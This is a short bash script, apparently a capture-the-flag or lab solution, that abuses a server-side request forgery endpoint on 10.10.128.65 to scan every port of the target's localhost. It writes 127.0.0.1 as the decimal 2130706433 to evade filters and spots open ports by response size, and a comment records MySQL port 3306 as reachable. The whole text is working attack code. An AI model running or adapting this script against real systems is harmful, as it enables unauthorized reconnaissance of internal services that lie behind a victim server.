#!/bin/bash
for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.128.65:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done

# http://[2130706433]:3306 is reachable
# https://stackoverflow.com/questions/9190190/how-to-use-curl-to-compare-the-size-of-the-page-with-deflate-enabled-and-without
# https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72
